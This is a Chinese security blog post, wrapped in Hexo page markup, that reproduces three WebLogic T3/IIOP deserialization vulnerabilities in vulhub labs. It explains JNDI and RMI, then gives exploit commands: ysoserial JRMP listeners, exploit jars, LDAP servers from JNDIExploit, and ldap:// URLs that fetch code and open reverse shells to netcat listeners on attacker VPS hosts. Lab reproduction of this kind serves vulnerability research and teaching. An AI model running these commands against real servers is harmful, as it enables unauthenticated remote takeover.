@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="rgba(71, 46, 98, 0.8)">
+  <meta name="author" content="kyrie711-wq">
+  <meta name="keywords" content="博客,技术,笔记">
+  
+    <meta name="description" content="WebLogic漏洞复现（2）-T3协议反序列化参考：  https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;364212.html https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_51330619&#x2F;article&#x2F;details&#x2F;120254124 https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzU5NDgxODU1MQ&#x3D;&#x3D;&amp;mid&#x3D;2247485058&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic漏洞复现（2）-T3协议反序列化">
+<meta property="og:url" content="https://kyrie711-wq.github.io/2026/03/11/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%882%EF%BC%89-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="snowhy的博客">
+<meta property="og:description" content="WebLogic漏洞复现（2）-T3协议反序列化参考：  https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;364212.html https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_51330619&#x2F;article&#x2F;details&#x2F;120254124 https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzU5NDgxODU1MQ&#x3D;&#x3D;&amp;mid&#x3D;2247485058&amp;a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kyrie711-wq.github.io/img/image-20260310153811500.png">
+<meta property="article:published_time" content="2026-03-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-11T12:34:32.377Z">
+<meta property="article:author" content="kyrie711-wq">
+<meta property="article:tag" content="WebLogic">
+<meta property="article:tag" content="T3协议">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="JNDI注入">
+<meta property="article:tag" content="CVE-2018-2628">
+<meta property="article:tag" content="CVE-2023-21839">
+<meta property="article:tag" content="CVE-2021-2394">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kyrie711-wq.github.io/img/image-20260310153811500.png">
+  
+  
+  
+  <title>WebLogic漏洞复现（2）-T3协议反序列化 - snowhy的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kyrie711-wq.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>snowhy的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/" target="_self">
+                <i class="iconfont icon-app"></i>
+                <span>安全项目</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" target="_self">
+                <i class="iconfont icon-bug-fill"></i>
+                <span>漏洞挖掘</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/CTF%E7%AB%9E%E8%B5%9B/" target="_self">
+                <i class="iconfont icon-flag-fill"></i>
+                <span>CTF竞赛</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/Web%E6%B8%97%E9%80%8F/" target="_self">
+                <i class="iconfont icon-windows-fill"></i>
+                <span>Web渗透</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/vdysjx.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WebLogic漏洞复现（2）-T3协议反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-11 00:00" pubdate>
+          March 11, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WebLogic漏洞复现（2）-T3协议反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="WebLogic漏洞复现（2）-T3协议反序列化"><a href="#WebLogic漏洞复现（2）-T3协议反序列化" class="headerlink" title="WebLogic漏洞复现（2）-T3协议反序列化"></a>WebLogic漏洞复现（2）-T3协议反序列化</h1><p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/364212.html">https://www.freebuf.com/vuls/364212.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51330619/article/details/120254124">https://blog.csdn.net/m0_51330619/article/details/120254124</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></li>
+</ul>
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>在复现之前先搞清楚 Java 安全常见的几个概念：</p>
+<table>
+<thead>
+<tr>
+<th>名词</th>
+<th>概念</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JNDI</td>
+<td>Java 命名和目录接口（Java Naming and Directory Interface），提供统一 API 访问多种命名服务（RMI、LDAP、DNS 等）。通过 <code>lookup()</code> 按名称查找资源，实现应用与资源之间的解耦。</td>
+</tr>
+<tr>
+<td>LDAP</td>
+<td>轻量级目录访问协议（Lightweight Directory Access Protocol），采用树状目录结构存储数据，用于用户认证、权限管理和资源查询。属于跨平台标准协议，默认端口 389（加密连接为 636）。</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>Java 原生远程方法调用机制（Remote Method Invocation），允许不同 JVM 之间像本地方法一样调用远程对象，通过 Stub&#x2F;Skeleton 实现透明通信，默认使用 JRMP 协议，常见注册端口为 1099。</td>
+</tr>
+<tr>
+<td>JRMP</td>
+<td>Java 远程方法协议（Java Remote Method Protocol），是 RMI 的底层通信协议，定义客户端与服务端之间的通信格式和数据传输规范。基于 TCP&#x2F;IP，仅支持 Java 到 Java 的通信，并负责对象序列化传输。</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>Oracle WebLogic 专有二进制协议，基于 JRMP 扩展设计，用于 WebLogic 集群节点通信、EJB 远程调用以及 JNDI 服务查找，默认端口 7001。</td>
+</tr>
+</tbody></table>
+<p>在 Java 安全中有一种经典利用手段就是 JNDI 注入，如 fastjson、log4j 都爆出来过，JNDI 注入的核心就是：用户可控输入 → <code>JNDI.lookup()</code> → 恶意协议服务 → 加载远程类 → 执行恶意代码。</p>
+<h2 id="关于T3协议"><a href="#关于T3协议" class="headerlink" title="关于T3协议"></a>关于T3协议</h2><p><strong>T3 协议</strong>是 WebLogic 应用服务器的私有传输协议，承载其 RMI 服务通信，由于直接信任并反序列化客户端传入的 Java 对象数据且无安全校验，存在严重的反序列化 RCE 风险。</p>
+<p>总结爆出来的 T3 反序列化漏洞可分为下面两类：</p>
+<p><strong>一、JNDI注入类</strong></p>
+<p>利用反序列化触发 <code>JNDI.lookup()</code>，使目标主动连接攻击者的 LDAP&#x2F;RMI 服务器，下载并加载恶意类执行命令。<strong>代表漏洞</strong>：CVE-2017-3248、CVE-2023-21839。<strong>特点</strong>：需目标能外连，JDK 8u191+ 后限制远程类加载，利用难度增加。</p>
+<p><strong>二、纯反序列化RCE类</strong></p>
+<p>利用 Gadget 链（如 CC 库或 WebLogic 内部类）在反序列化过程中直接触发 <code>Runtime.exec()</code> 执行命令，无需外连。<strong>代表漏洞</strong>：CVE-2015-4852、CVE-2017-10271、CVE-2018-2893。<strong>特点</strong>：本地执行不受 JDK JNDI 限制，但依赖目标存在特定类，可通过类黑名单修复。</p>
+<h2 id="Weblogic-WLS-Core-Components-反序列化RCE（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化RCE（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化RCE（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化RCE（CVE-2018-2628）</h2><p><strong>受影响的版本</strong>：</p>
+<ul>
+<li>10.3.6.0</li>
+<li>12.1.3.0</li>
+<li>12.2.1.2</li>
+<li>12.2.1.3</li>
+</ul>
+<p><strong>漏洞原理</strong>：CVE-2018-2628 是 Oracle WebLogic Server WLS Core Components 组件中存在的一个高危反序列化漏洞，攻击者无需身份认证即可通过 T3 或 IIOP 协议向服务器发送精心构造的恶意序列化数据，利用 <code>weblogic.wsee.service.WorkListService</code> 等类在反解析过程中实例化任意对象链（Gadget Chain），从而在目标服务器上执行任意系统命令，导致服务器被完全接管。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>依旧是 vulhub 起 docker 就行：</p>
+<p><img src="/img/image-20260310153811500.png" srcset="/img/loading.gif" lazyload alt="vulhub 环境搭建成功"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者首先启动恶意 JRMP 监听器等待连接，随后向目标 WebLogic 的 T3 端口发送包含远程引用（指向攻击者监听地址）的序列化数据包，诱导目标服务器主动回连攻击者，攻击者借此机会下发真正的恶意利用链载荷，目标在二次反序列化过程中最终执行预设的系统命令。</p>
+<p>先启动 JRMP 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="hljs-string">&#x27;touch /tmp/1.txt&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>ysoserial.jar 我的版本是比较新的，不同版本有不同的利用差异：</p>
+<p><img src="/img/image-20260310154034140.png" srcset="/img/loading.gif" lazyload alt="启动 JRMP 监听"></p>
+<p>然后利用 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">exploit.py</a> 脚本，向目标 WebLogic（<code>http://your-ip:7001</code>）发送数据包（注意用 python2）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 weblogic.py 47.96.99.165 7001 /ysoserial.jar 47.96.99.165 9999 JRMPClient<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260310154143444.png" srcset="/img/loading.gif" lazyload alt="发送数据包"></p>
+<p>看 JRMP 回显已经连接上了：</p>
+<p><img src="/img/image-20260310154218041.png" srcset="/img/loading.gif" lazyload alt="JRMP 回连成功"></p>
+<p>最终利用成功：</p>
+<p><img src="/img/image-20260310154339860.png" srcset="/img/loading.gif" lazyload alt="命令执行成功"></p>
+<h2 id="WebLogic-CVE-2023-21839"><a href="#WebLogic-CVE-2023-21839" class="headerlink" title="WebLogic CVE-2023-21839"></a>WebLogic CVE-2023-21839</h2><p><strong>受影响的版本</strong>：</p>
+<ul>
+<li>12.2.1.3.0</li>
+<li>12.2.1.4.0</li>
+<li>14.1.1.0.0</li>
+</ul>
+<p><strong>漏洞原理</strong>：WebLogic CVE-2023-21839 是一个高危的远程代码执行（RCE）漏洞，其核心原理在于 WebLogic Server 在处理 T3&#x2F;IIOP 协议请求时，对 JNDI 查找操作缺乏足够的安全验证。攻击者可以通过构造恶意的 T3&#x2F;IIOP 数据包，诱导服务器向攻击者控制的恶意 JNDI 服务（如 LDAP 或 RMI）发起 lookup 请求；由于 WebLogic 内部类（如 <code>ForeignOpaqueReference</code>）在反序列化或解析远程对象引用时存在逻辑缺陷，服务器会加载并执行恶意服务返回的恶意字节码，从而在未经身份验证的情况下实现远程命令执行，导致服务器被完全接管。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><img src="/img/image-20260311143016980.png" srcset="/img/loading.gif" lazyload alt="CVE-2023-21839 环境搭建"></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>DNSLog 探测</strong></p>
+<p>通过 T3 协议向目标服务器发送构造恶意的 <code>ForeignOpaqueReference</code> 对象，诱导其在服务端执行 JNDI 查找并主动连接攻击者指定的 LDAP 地址；由于该 LDAP 地址指向一个由 DNSLog 平台生成的唯一子域名，一旦目标服务器尝试解析该域名，攻击者控制的 DNS 服务器便会记录下查询请求。</p>
+<p>exp 链接：<a target="_blank" rel="noopener" href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">https://github.com/DXask88MA/Weblogic-CVE-2023-21839</a></p>
+<p>运行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar Weblogic-CVE-2023-21839.jar 靶场ip:7001 ldap://xxxx.dnslog.cn<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260311151319898.png" srcset="/img/loading.gif" lazyload alt="DNSLog 探测成功"></p>
+<p>探测成功，确认漏洞存在。</p>
+<p><strong>反弹Shell</strong></p>
+<p>在网上找了一些 JNDI 注入的 jar 不太会用，后面找项目自己编译了一个。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/zzwlpx/JNDIExploit">https://github.com/zzwlpx/JNDIExploit</a></p>
+<p>先在 vps2 上启动一个 LDAP 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i vps2<br></code></pre></td></tr></table></figure>
+
+<p>vps2 还需要开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure>
+
+<p>然后用 vps1 执行攻击操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar Weblogic-CVE-2023-21839.jar 靶机ip:7001 ldap://vps2:1389/Basic/ReverseShell/vps2/9999<br></code></pre></td></tr></table></figure>
+
+<p>此时查看 LDAP 服务器，成功反弹 shell：</p>
+<p><img src="/img/image-20260311163716340.png" srcset="/img/loading.gif" lazyload alt="LDAP 服务回调"></p>
+<p>反弹 shell 成功：</p>
+<p><img src="/img/image-20260311163758824.png" srcset="/img/loading.gif" lazyload alt="反弹 Shell 成功"></p>
+<h2 id="WebLogic反序列化漏洞（CVE-2021-2394）"><a href="#WebLogic反序列化漏洞（CVE-2021-2394）" class="headerlink" title="WebLogic反序列化漏洞（CVE-2021-2394）"></a>WebLogic反序列化漏洞（CVE-2021-2394）</h2><p><strong>受影响的版本</strong>：</p>
+<ul>
+<li>Oracle WebLogic Server 12.2.1.3.0</li>
+<li>Oracle WebLogic Server 12.2.1.4.0</li>
+<li>Oracle WebLogic Server 14.1.1.0.0</li>
+</ul>
+<p><strong>漏洞原理</strong>：CVE-2021-2394 是一个 WebLogic IIOP 协议下的反序列化远程代码执行漏洞，其核心原理是攻击者利用未被列入黑名单的 <code>FilterExtractor</code> 和 <code>SerializationHelper</code> 类构建利用链，在反序列化过程中通过 <code>SerializationHelper.readAttributeAccessor</code> 方法触发<strong>二次反序列化</strong>，从而绕过官方针对前序漏洞（如 CVE-2020-14825）设置的类过滤机制，最终导致恶意对象（如 JNDI 注入或命令执行链）被加载并执行任意代码。</p>
+<h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>可以沿用上一个漏洞环境。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>其实漏洞利用的手法比较相似，都需要起一个 LDAP 用于靶机远程加载。</p>
+<p>在 vps 上起一个 LDAP 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i vps<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260311175011830.png" srcset="/img/loading.gif" lazyload alt="启动 LDAP 服务"></p>
+<p>然后监听 7777 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 7777<br></code></pre></td></tr></table></figure>
+
+<p>最后利用现有的 POC 进行攻击发包（POC 地址：<a target="_blank" rel="noopener" href="https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0%EF%BC%89%EF%BC%9A">https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0）：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar CVE_2021_2394.jar 靶机 7001 <span class="hljs-string">&quot;ldap://vps:1389/Basic/ReverseShell/vps/7777&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260311175332464.png" srcset="/img/loading.gif" lazyload alt="发送 POC"></p>
+<p>最终利用成功：</p>
+<p><img src="/img/image-20260311175432139.png" srcset="/img/loading.gif" lazyload alt="反弹 Shell 成功1"></p>
+<p><img src="/img/image-20260311175459560.png" srcset="/img/loading.gif" lazyload alt="反弹 Shell 成功2"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞挖掘</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WebLogic/" class="print-no-link">#WebLogic</a>
+      
+        <a href="/tags/T3%E5%8D%8F%E8%AE%AE/" class="print-no-link">#T3协议</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/" class="print-no-link">#JNDI注入</a>
+      
+        <a href="/tags/CVE-2018-2628/" class="print-no-link">#CVE-2018-2628</a>
+      
+        <a href="/tags/CVE-2023-21839/" class="print-no-link">#CVE-2023-21839</a>
+      
+        <a href="/tags/CVE-2021-2394/" class="print-no-link">#CVE-2021-2394</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/10/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6-weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="常见中间件-WebLogic漏洞复现与利用分析">
+                        <span class="hidden-mobile">常见中间件-WebLogic漏洞复现与利用分析</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
